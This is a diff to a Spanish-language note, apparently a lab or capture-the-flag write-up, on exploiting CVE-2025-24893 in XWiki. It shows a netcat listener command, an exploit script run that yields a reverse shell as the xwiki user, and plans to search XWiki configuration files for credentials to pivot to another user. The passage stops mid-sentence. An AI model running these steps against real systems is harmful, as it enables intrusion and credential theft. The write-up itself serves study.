@@ -18,5 +18,10 @@ el cual nos explica como explotarlo.
 ## Explotación
 Para explotarlo necesitamos ponernos primero en escucha con [[NETCAT]] en un puerto de nuestra maquina `nc -nlvp 4444`
 
-Después deberemos ejecutar el Python ````
-python3 cve-2025-24893.py <target_base_url> <lhost> <lport>
+Después deberemos ejecutar el Python 
+`python3 cve-2025-24893.py <target_base_url> <lhost> <lport>`
+
+En nuestro listenner obtendremos una Shell como `xWiki`
+Si navegamos al directorio `/home` vemos que hay un usuario `Oliver`, para poder pivotar a el, buscaremos información en los archivos de configuración de `xWiki`
+
+Estos ficheros de configuracion se encuentran en `/usr/lib/xwiki` exactamente miraremos el archivo 
